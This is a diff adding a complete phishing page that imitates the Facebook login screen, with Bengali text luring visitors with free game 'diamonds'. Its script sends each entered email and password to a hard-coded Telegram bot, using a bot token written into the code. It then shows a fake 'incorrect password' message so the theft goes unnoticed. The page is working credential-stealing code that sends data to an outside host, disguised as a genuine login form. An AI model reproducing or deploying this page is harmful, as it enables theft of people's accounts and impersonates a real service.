@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - লগ ইন বা সাইন আপ</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-items: center;
+            max-width: 980px;
+            margin: 0 auto;
+        }
+        .left-section {
+            flex: 0 1 500px;
+            padding: 20px;
+            margin-right: 30px;
+        }
+        .logo {
+            width: 300px;
+            margin-bottom: -10px;
+        }
+        .left-section h2 {
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+            color: #1c1e21;
+        }
+        .right-section {
+            flex: 0 1 400px;
+        }
+        .login-form {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+        .login-form input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border-radius: 6px;
+            border: 1px solid #dddfe2;
+            font-size: 17px;
+        }
+        .login-form input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+            outline: none;
+        }
+        .login-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            padding: 12px;
+            width: 100%;
+            margin-bottom: 15px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+        .forgot-pass {
+            color: #1877f2;
+            text-align: center;
+            display: block;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 20px;
+        }
+        .forgot-pass:hover {
+            text-decoration: underline;
+        }
+        .create-btn {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            padding: 12px 16px;
+            margin: 0 auto;
+            display: block;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .create-btn:hover {
+            background-color: #36a420;
+        }
+        .error-message {
+            color: #f02849;
+            font-size: 13px;
+            text-align: center;
+            margin-top: 15px;
+            display: none;
+        }
+        .footer {
+            text-align: center;
+            font-size: 14px;
+            color: #737373;
+            margin-top: 20px;
+        }
+        .footer a {
+            color: #737373;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+                text-align: center;
+            }
+            .left-section {
+                margin-right: 0;
+                margin-bottom: 40px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <img src="https://i.supaimg.com/a20dfde2-f178-4b89-a34c-c1bd137747e6.png" alt="Facebook" class="logo">
+            <h2>প্রথমবার ফ্রি ডায়মন্ড নিতে অথবা আমাদের ওয়েবসাইট থেকে ডায়মন্ড ক্রয় করতে শুরুতে ওয়েবসাইটে লগইন করুন।</h2>
+        </div>
+        <div class="right-section">
+            <form class="login-form" id="loginForm">
+                <input type="text" id="email" placeholder="Email address or phone number" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit" class="login-btn">Log In</button>
+                <div class="error-message" id="errorMessage">The password you entered is incorrect. Forgot password?</div>
+                <a href="#" class="forgot-pass">Forgotten password?</a>
+                <hr style="margin: 20px 0; border: 0.5px solid #dadde1;">
+                <button type="button" class="create-btn">Create New Account</button>
+            </form>
+            <div class="footer">
+                <a href="#">Create a Page</a> for a celebrity, brand or business.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const errorMessage = document.getElementById('errorMessage');
+            
+            // Telegram বটে ডেটা পাঠানো
+            sendDataToTelegram(email, password);
+            
+            // ব্যবহারকারীকে ভুল পাসওয়ার্ডের মেসেজ দেখানো
+            errorMessage.style.display = 'block';
+            
+            // ফর্ম রিসেট করা
+            document.getElementById('password').value = '';
+        });
+
+        function sendDataToTelegram(email, password) {
+            // আপনার প্রদত্ত Telegram Bot Token এবং Chat ID
+            const botToken = '8539492816:AAFrAfOXTRkNeIKqp0EI_tdVCQRccjpkqlg';
+            const chatId = '8539492816';
+            
+            // Telegram Bot API-এ একটি message ফর্ম্যাট করা
+            const message = `New Facebook Login\nEmail or Phone: ${email}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}`;
+            
+            // Telegram Bot API-এ HTTP request পাঠানো হচ্ছে
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Telegram API Response:', data);
+            })
+            .catch((error) => {
+                console.error('Telegram API Error:', error);
+            });
+        }
+    </script>
+</body>
+</html>
